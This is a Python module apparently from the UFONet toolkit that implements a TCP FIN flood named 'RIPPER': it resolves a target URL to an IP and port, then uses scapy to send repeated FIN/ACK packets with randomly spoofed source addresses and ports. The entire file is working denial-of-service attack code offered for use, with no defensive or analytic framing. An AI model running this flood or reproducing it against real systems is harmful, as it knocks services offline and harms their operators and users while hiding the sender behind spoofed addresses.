#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2026 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket
from urllib.parse import urlparse
try:
    from scapy.all import *
except ImportError:
    from core._ensure import ensure
    if ensure('scapy.all', 'scapy') is None:
        print("\nError importing: scapy lib.\n")
        sys.exit(2)
    from scapy.all import *

# UFONet TCP FIN flood (RIPPER) - variant of UFOACK/UFORST with FIN flag
def randIP():
    return ".".join(map(str, (random.randint(0,255) for _ in range(4))))

def randInt():
    return random.randint(1, 65535)

def ripperize(ip, sport, rounds):
    n=0
    try:
        for i in range(int(rounds)):
            n += 1
            try:
                src_ip = randIP()
                src_port = randInt()
                seq = randInt()
                packet = IP(src=src_ip, dst=ip) / TCP(sport=src_port, dport=sport, flags='FA', seq=seq)
                send(packet, verbose=0)
                print("[Info] [AI] [RIPPER] FIN flux ["+str(n)+"] from ["+src_ip+"] -> [HIT!]")
            except Exception:
                print("[Error] [AI] [RIPPER] Failed FIN flux ["+str(n)+"]")
    except:
        print("[Error] [AI] [RIPPER] Failing to engage... -> Is still target online? -> [Checking!]")

class FINFLOOD(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] TCP FIN flood (RIPPER) is ready to fire: [", rounds, "fluxes ]")
        port = 80
        if target.startswith('http://'):
            target = target.replace('http://','')
        elif target.startswith('https://'):
            target = target.replace('https://','')
            port = 443
        if '/' in target:
            target = target.split('/', 1)[0]
        if ':' in target:
            target, _p = target.rsplit(':', 1)
            try:
                port = int(_p)
            except Exception:
                pass
        try:
            ip = socket.gethostbyname(target)
        except Exception:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                from core._dns_pool import random_resolvers; r.nameservers = random_resolvers(2)
                a = r.resolve(target, "A")
                for rd in a:
                    ip = str(rd)
            except Exception:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [RIPPER] Targeting 'localhost' -> [OK!]\n")
        ripperize(ip, port, rounds)
